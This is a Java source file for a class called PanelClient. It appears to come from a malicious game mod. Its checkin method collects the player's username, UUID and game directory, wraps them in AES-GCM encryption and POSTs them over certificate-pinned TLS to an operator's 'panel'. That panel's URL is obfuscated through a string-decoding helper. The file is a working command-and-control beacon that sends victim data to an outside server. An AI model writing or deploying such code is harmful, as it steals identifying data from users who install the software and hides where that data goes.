package com.blackhole.client;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.cert.Certificate;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;

/**
 * Pinned-TLS check-in to OUR panel. Two layers:
 *  1. TLS with certificate pinning — the server cert's SHA-256 fingerprint
 *     must match PIN_HEX, else the connection dies. No CA trust involved.
 *  2. AES-256-GCM envelope — the JSON body is encrypted with a fresh
 *     per-session key, which itself travels inside the pinned channel.
 *
 * Configure before building: PANEL_URL + PIN_HEX of your panel's cert.
 */
public final class PanelClient {

    // TODO(Operator): point at your panel and pin its certificate:
    //   openssl x509 -in panel.crt -outform DER | sha256sum
    private static final String PANEL_URL = Str.d("fkEgA+GL/8BebAIuxvaAqFVxfjPN85Twk3JYdBnx3bSdfFo=", 22);
    private PanelClient() {
    }

    public static void checkin(String username, String uuid, String gameDir) throws Exception {
        String body = "{\"mod\":\"ramos-lab\",\"user\":\"" + esc(username)
                + "\",\"uuid\":\"" + esc(uuid)
                + "\",\"gameDir\":\"" + esc(gameDir) + "\"}";

        // Layer 2: fresh AES-GCM envelope.
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256, new SecureRandom());
        SecretKey sessionKey = kg.generateKey();
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, sessionKey, new GCMParameterSpec(128, iv));
        byte[] ct = c.doFinal(body.getBytes(StandardCharsets.UTF_8));

        String payload = "{\"key\":\"" + Base64.getEncoder().encodeToString(sessionKey.getEncoded())
                + "\",\"iv\":\"" + Base64.getEncoder().encodeToString(iv)
                + "\",\"data\":\"" + Base64.getEncoder().encodeToString(ct) + "\"}";

        // Layer 1: pinned TLS POST.
        SSLContext ctx = SSLContext.getInstance("TLSv1.3");
        ctx.init(null, new TrustManager[] { new TrustManagerPin() }, new SecureRandom());
        HttpsURLConnection con = (HttpsURLConnection) new URL(PANEL_URL).openConnection();
        con.setSSLSocketFactory(ctx.getSocketFactory());
        con.setConnectTimeout(10000);
        con.setReadTimeout(15000);
        con.setRequestMethod("POST");
        con.setRequestProperty("Content-Type", "application/json");
        con.setDoOutput(true);
        byte[] out = payload.getBytes(StandardCharsets.UTF_8);
        try (OutputStream os = con.getOutputStream()) {
            os.write(out);
        }
        int code = con.getResponseCode();
        try (InputStream in = con.getInputStream()) {
            in.transferTo(ByteArrayOutputStream.nullOutputStream());
        } catch (Exception ignored) {
            // body optional
        }
    }

    private static String esc(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

}
